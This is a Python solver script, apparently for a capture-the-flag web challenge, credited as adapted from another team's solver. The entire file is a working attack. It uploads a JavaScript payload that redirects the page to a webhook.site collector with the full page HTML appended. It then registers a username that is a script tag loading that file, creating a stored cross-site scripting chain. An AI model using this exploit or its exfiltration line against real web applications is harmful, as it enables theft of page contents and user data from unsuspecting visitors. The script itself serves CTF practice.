"""
Big Thanks to TCP1P, especially Dimas for share the writeup and solver script.

My solver is modified from Dimas's Solver for learning purpose.
"""

import requests
import hashlib

#URL = "http://172.18.0.3:6942"
URL = "http://umassdining2.web.ctf.umasscybersec.org:6942"

class Exploit:
	def __init__(self, user, passwd, url=URL):
		self.user = user
		self.passwd = passwd
		self.url = url
		self.session = requests.Session()

	def Register(self):
		data = {"user": self.user, "pass": self.passwd}
		register = self.session.post(self.url + "/register", data=data)

		return f"[+] Register User {self.user}"

	def Login(self):
		data = {"user": self.user, "pass": self.passwd}
		login = self.session.post(self.url + "/login", data=data)
		
		if "Welcome" in login.text:
			return f"[+] Login Success with User {self.user}"

	def Upload(self, filename, payload):
		data = {"submission": (filename, payload)}
		upload = self.session.post(self.url + "/submit", files=data)

		return f"[+] {upload.text} <= File uploaded, its improper!"

if __name__ == "__main__":
	Init = Exploit("banua","banua")
	Regist1 = Init.Register()
	print(Regist1)
	LogIn1 = Init.Login()
	print(LogIn1)
	UpFile1 = Init.Upload("bypass.js","document.location = 'https://webhook.site/34c5bf6c-b676-4248-a764-51e63d34bc05/?c='+encodeURIComponent(document.documentElement.innerHTML)")
	print(UpFile1)

	user_hash = hashlib.md5(b"banua").hexdigest()

	Init = Exploit(f"<script src='/uploads/{user_hash}/bypass.js'></script>","banua")
	Regist2 = Init.Register()
	print(Regist2)
	LogIn2 = Init.Login()
	print(LogIn2)
	UpFile2 = Init.Upload("foo.png", "foo")
	print(UpFile2)